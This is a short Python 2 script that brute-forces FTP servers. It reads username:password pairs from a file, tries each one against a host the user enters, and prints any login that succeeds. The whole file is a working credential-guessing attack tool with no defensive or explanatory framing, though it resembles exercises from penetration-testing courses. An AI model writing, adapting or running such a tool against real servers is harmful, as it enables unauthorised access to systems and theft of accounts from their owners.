#!/usr/bin/python

# lib which allows ftp connect 
import ftplib

def bruteLogin(hostname, passwdFile):
    try:
        pf = open(passwdFile, 'r')
    except:
        print "[*] file doesnt exist"
    
    for line in pf.readlines():
        userName = line.split(":")[0]
        password = line.split(":")[1].strip('\n')
        print('[*] Trying username: ' + userName + ' password ' + password)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(userName, password)
            print('[*] login succeded ' + userName + ' ' + password)
            ftp.quit()
            return 
            #return(userName, password)
        except:
            pass
    print('[*] password not in list')


def main():
    host = raw_input("[*] Enter the ip adress: ")
    passwdFile = raw_input("[*] Enter User/Password file path: ")
    bruteLogin(host, passwdFile)

main()
